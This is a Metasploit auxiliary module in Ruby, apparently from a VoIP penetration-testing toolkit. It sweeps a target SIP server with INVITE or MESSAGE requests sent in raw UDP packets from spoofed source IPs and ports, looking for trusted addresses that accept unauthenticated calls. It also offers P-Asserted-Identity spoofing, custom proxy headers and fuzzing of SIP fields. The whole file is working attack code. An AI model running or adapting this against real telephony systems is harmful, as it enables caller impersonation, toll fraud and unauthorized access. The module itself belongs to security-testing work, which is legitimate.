class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Scanner
        include Msf::Auxiliary::SIP

	def initialize
		super(
			'Name'        => 'SIP Services Trust Analyzer',
			'Version'     => '$Revision$',
			'Description' => 'SIP Services Trust Analyzer',
			'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
			'License'     => MSF_LICENSE
		)

		begin
			require 'pcaprub'
			@@havepcap = true
		rescue ::LoadError
			@@havepcap = false
		end

		deregister_options('FILTER','PCAPFILE','RPORT', 'RHOSTS', 'RPORTS', 'RHOST' )
		register_options(
		[
			OptString.new('SRC_RPORTS', [true, 'Port Range to Perform Trust Sweep', "5060-5065"]),
			OptAddressRange.new('SRC_RHOSTS', [true, 'IP Range to Perform Trust Sweep.']),
			OptAddress.new('SIP_SERVER', [true, 'Target SIP Server']),
			OptString.new('TO',   [ true, "Destination Number at Target SIP Server", "1000"]),
			OptString.new('FROM',   [ false, "Source Number at Target SIP Server", nil]),
			OptString.new('FROMNAME',   [ false, "Source Name at Target SIP Server", nil]),
			OptString.new('ACTION',   [ true, "Action for SIP Trust Analysis : SCAN_INVITE | CALL | SCAN_MESSAGE | MESSAGE", "SCAN_INVITE"]),
			OptInt.new('SIP_PORT',   [true, 'Target Port of The SIP Server',5060]),
			OptString.new('MESSAGE_CONTENT',   [ false, "Message Content", nil]),
		], self.class)

		register_advanced_options(
		[
			OptString.new('SAVE_FILE',  [ false, "File to Save Requests", "/tmp/savereq" ]),
			OptString.new('CONTACT',  [ false, "Contact Field for Target SIP Server", nil]),
			OptBool.new('P-Asserted-Identity', [false, 'Spoof for Proxy Identity Field', false]),
			OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
			OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
			OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
			OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
			OptBool.new('DEBUG',   [ false, "Verbose Level", false]),
			OptBool.new('VERBOSE',   [ false, "Verbose Level", false]),
		], self.class)
	end

	def run
		thread_num=datastore['THREADS']
		src_hosts = Rex::Socket::RangeWalker.new(datastore['SRC_RHOSTS'])
		src_ports = Rex::Socket.portspec_crack(datastore['SRC_RPORTS'])
		ip = datastore['SIP_SERVER']
		port = datastore['SIP_PORT']
		to = datastore['TO']
		iplst = []
		begin

			#Building Custom Headers
			customheader = ""
			customheader << datastore['CUSTOMHEADER']+"\r\n" if datastore['CUSTOMHEADER'] != nil
			customheader << "P-Charging-Vector: "+datastore['P-Charging-Vector']+"\r\n" if datastore['P-Charging-Vector'] != nil
			customheader << "Record-Route: "+datastore['Record-Route']+"\r\n" if datastore['Record-Route'] != nil
			customheader << "Route: "+datastore['Route']+"\r\n" if datastore['Route'] != nil	

			if datastore['ACTION'] == 'MESSAGE' or datastore['ACTION'] == 'CALL'
				if datastore['FROM']
					if datastore['FROM'] =~ /FUZZ/
						from=Rex::Text.pattern_create(datastore['FROM'].split(" ")[1].to_i)
						fromname=nil
					else
						from = datastore['FROM'] 
						if datastore['FROMNAME'] =~ /FUZZ/ 
							fromname=Rex::Text.pattern_create(datastore['FROMNAME'].split(" ")[1].to_i)
						else
							fromname = datastore['FROMNAME'] || datastore['FROM']
						end
					end
					 
				else
					raise ArgumentError, "FROM must be defined"
				end



				if datastore['P-Asserted-Identity'] == true
					cheader = customheader+"P-Asserted-Identity: #{from}\r\n" 
				else
					cheader = customheader
				end

				src_ip=datastore['SRC_RHOSTS']
				src_port=datastore['SRC_RPORTS'].to_i

				if datastore['ACTION'] == 'CALL'
					send_request(src_ip,src_port,ip,port,to,from,cheader,'INVITE',fromname)
				else
					if datastore['MESSAGE_CONTENT'] =~ /FUZZ/
						message = Rex::Text.pattern_create(datastore['MESSAGE_CONTENT'].split(" ")[1].to_i)
					else	
						message = datastore['MESSAGE_CONTENT']
					end
					send_request(src_ip,src_port,ip,port,to,from,cheader,'MESSAGE',fromname,message)
				end

			else
				numip = src_hosts.num_ips
				while (iplst.length < numip)
					ipa = src_hosts.next_ip
					if (not ipa)
						break
					end
					iplst << ipa
				end
				print_status("Performing Trust sweep for IP range #{datastore['SRC_RHOSTS']}")
				if datastore['ACTION'] == 'SCAN_MESSAGE'
					req_type = 'MESSAGE'
				else
					req_type = 'INVITE'
				end
				vprint_status("Request Type is #{req_type}")
				while(not iplst.nil? and not iplst.empty?)
					a = []
					1.upto(thread_num) do
						a << framework.threads.spawn("Module(#{self.refname})", false, iplst.shift) do |src_ip|
							next if src_ip.nil?
							print_status "Sending Spoofed Packets for Source IP : #{src_ip}"

							src_ports.each do |src_port|
								#Setting Spoof Options
								from = datastore['FROM'] || src_ip+":"+src_port.to_s
								message="Trusted IP and Port "+src_ip+":"+src_port.to_s+"\r\n" 

								if datastore['P-Asserted-Identity'] == true
									cheader = customheader+"P-Asserted-Identity: "+src_ip+":"+src_port.to_s+"\r\n" 
								else
									cheader = customheader
								end
								send_request(src_ip,src_port,ip,port,to,from,cheader,req_type,fromname,message)
							end

						end
					end
					a.map {|x| x.join }
				end
				print_good("Spoofed Trust Sweep Completed")
			end

		rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
		rescue ::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end

	def send_request(src_ip,src_port,ip,port,to,from,cheader,req_type,fromname=nil,message=nil)
		#Assembling Packet
		open_pcap
		p = PacketFu::UDPPacket.new
		p.ip_saddr = src_ip
		p.ip_daddr = ip 
		p.ip_ttl = 255
		p.udp_sport = src_port
		p.udp_dport = port
		p.payload=prep_req(src_ip,src_port,ip,port,to,from,cheader,req_type,fromname,message)
		p.recalc

		#Sending Packet
		if datastore['SAVE_FILE']
			save_file=File.new(datastore['SAVE_FILE'], "w")
			save_file.write p.payload
			save_file.close
		end
		ret = send(ip,p)
		if ret == :done
			vprint_status("#{src_ip}: Sent a packet to #{ip} from #{src_port}")
		else
			print_error("#{src_ip}: Packet not sent for port #{src_port} ")
		end
		close_pcap

	end

	def prep_req(src_addr,src_port,ip,port,to,from,cheader,req_type,fromname=nil,message=nil)
		fromname="#{src_addr}:#{src_port}" if fromname.nil?

		#Preparing Request
		data =  "#{req_type} sip:#{to}@#{ip} SIP/2.0\r\n"
		data += "Via: SIP/2.0/UDP #{src_addr}:#{src_port};branch=branch#{Rex::Text.rand_text_alphanumeric(10)};rport\r\n"
		data += "Max-Forwards: 70\r\n"

		if ! ( from =~ /@/ )
			from = "#{from}@#{src_addr}"
		end
		if fromname == nil
			data += "From: <sip:#{from}>\r\n"
		else
			data += "From: \"#{fromname}\" <sip:#{from}>;tag=tag#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
		end
		if datastore['FROM'] =~ /FUZZ/
			data += "Contact: <sip:123@#{src_addr}>\r\n"
		elsif datastore['CONTACT'] =~ /FUZZ/
			data += "Contact: <sip:#{Rex::Text.pattern_create(datastore['CONTACT'].split(" ")[1].to_i)}@#{src_addr}>\r\n"
		else
			data += "Contact: <sip:#{from}>\r\n"
		end
		data += "To: <sip:#{to}@#{ip}>\r\n"
		data += "Call-ID: call#{Rex::Text.rand_text_alphanumeric(10)}@#{src_addr}\r\n"
		data += "CSeq: 1 #{req_type}\r\n"
		data += "User-Agent: Test Agent\r\n"
		#data += "Date: Tue, 26 Mar 2013 12:37:54 GMT\r\n"
		data += "Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO\r\n"
		data += "Expires: 3600\r\n"
		data += "Supported: replaces, timer\r\n"
		data += cheader 


		if req_type=='INVITE' 
			data += "Content-Type: application/sdp\r\n"

			idata = "v=0\r\n"
			idata += "o=root 1716603896 1716603896 IN IP4 #{src_addr}\r\n"
			idata += "s=Test Source\r\n"
			idata += "c=IN IP4 #{src_addr}\r\n"
			idata += "t=0 0\r\n"
			idata += "m=audio 10024 RTP/AVP 0 101\r\n"
			idata += "a=rtpmap:0 PCMU/8000\r\n"
			idata += "a=rtpmap:101 telephone-event/8000\r\n"
			idata += "a=fmtp:101 0-16\r\n"
			idata += "a=ptime:20\r\n"
			idata += "a=sendrec\r\n"

			data += "Content-Length: #{idata.length}\r\n\r\n#{idata}"
		else
			idata=message || ""
			data << "Content-Type: text/plain\r\n"
			data << "Content-Length: #{idata.length}\r\n\r\n"		    
			data << idata
		end
		return data		

	end


	def send(ip,pkt)
		begin
			capture_sendto(pkt, ip)
		rescue RuntimeError => e
			return :error
		end
		return :done
	end


end
